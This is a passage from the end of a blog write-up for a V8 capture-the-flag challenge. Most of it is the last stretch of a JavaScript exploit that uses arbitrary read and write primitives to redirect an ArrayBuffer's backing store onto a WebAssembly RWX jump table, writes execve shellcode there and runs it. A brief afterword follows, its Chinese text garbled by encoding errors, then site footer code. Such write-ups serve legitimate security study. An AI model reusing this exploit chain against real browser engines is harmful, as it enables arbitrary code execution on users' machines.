rsi,rsi</span></span><br><span class="line">  <span class="number">0x3bc0c748d23148f6n</span>,  <span class="comment">// xor rdx,rdx ; mov rax,59</span></span><br><span class="line">  <span class="number">0x909090050f000000n</span>,  <span class="comment">// syscall ; NOP,NOP,NOP (padding)</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> dataview_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(sc_arr.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(dataview_buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addrOf</span>(dataview_buffer) + <span class="number">0x24n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var addr_f = addrOf(f);</span></span><br><span class="line"><span class="comment">%DebugPrint(f);</span></span><br><span class="line"><span class="comment">var shared_function_info_addr = arbRead32(addr_f + 0x10n);</span></span><br><span class="line"><span class="comment">var trusted_function_data_addr = arbRead32(shared_info_addr + 0x4n);</span></span><br><span class="line"><span class="comment">internal_addr = arbRead32(trusted_function_data_addr + 0x10n);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">trusted_data_addr = <span class="title function_">arbRead32</span>(<span class="title function_">addrOf</span>(wasmInstance) + <span class="number">0xcn</span>);</span><br><span class="line">jump_table_start_addr = <span class="title function_">arbRead64</span>(trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Trusted Data Addr : 0x&#x27;</span> + trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Jump Table Start Addr : 0x&#x27;</span> + jump_table_start_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Backing Store Addr : 0x&#x27;</span> + <span class="title function_">arbRead64</span>(buf_backing_store_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">helpers.printhex(jump_table_start_addr);</span></span><br><span class="line"><span class="comment">helpers.printhex(arbRead64(buf_backing_store_addr));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">     </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Overwriting Backing Store Addr ...&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">arbWrite</span>(buf_backing_store_addr, jump_table_start_addr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Writing Shellcode to wasm rwx page ...&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc_arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, helpers.<span class="title function_">i64tof64</span>(sc_arr[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] Trigger Shellcode !&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<h3 id="å¾Œè¨˜"><a href="#å¾Œè¨˜" class="headerlink" title="å¾Œè¨˜"></a>å¾Œè¨˜</h3><p>ç„¶å¾Œæˆ‘åœ¨ 9&#x2F;20 å¯«å¥½ Exploit æƒ³èªªæ‡‰è©²ä¸ç”¨æ”¹é¡Œç›®äº†<br>çµæœæœ‰äººåœ¨ 10&#x2F;2 æ—©ä¸Šåœ¨ X ä¸Šç™¼äº† Exploit</p>
<p><a target="_blank" rel="noopener" href="https://x.com/r1ngz3ro/status/1973448435614490640">https://x.com/r1ngz3ro/status/1973448435614490640</a> </p>
<p>å¾Œé¢å¾ˆèªçœŸçš„åœ¨æƒ³è¦ä¸è¦é–‹ Heap Sandbox è®“å¤§å®¶ç¹çš„ï¼Œä½†æœ€å¾Œæ”¶æ‰‹äº† XDDD<br>ç¾å ´æ²’ä»€éº¼äººæ‰“é V8ï¼Œæ‰€ä»¥é€™é¡Œæ²’äººæƒ³è§£ QQ</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/V8/" rel="tag"># V8</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/09/28/AEGIS-2025-Quals/" rel="prev" title="ç¥ç›¾ç›ƒ 2025 åˆè³½">
      <i class="fa fa-chevron-left"></i> ç¥ç›¾ç›ƒ 2025 åˆè³½
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Patch"><span class="nav-number">2.</span> <span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Write-Barrier"><span class="nav-number">3.1.</span> <span class="nav-text">Write Barrier</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Trigger-UAF"><span class="nav-number">3.2.</span> <span class="nav-text">Trigger UAF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%8C%E8%A8%98"><span class="nav-number">4.</span> <span class="nav-text">å¾Œè¨˜</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Terry1234</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Terry1234</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
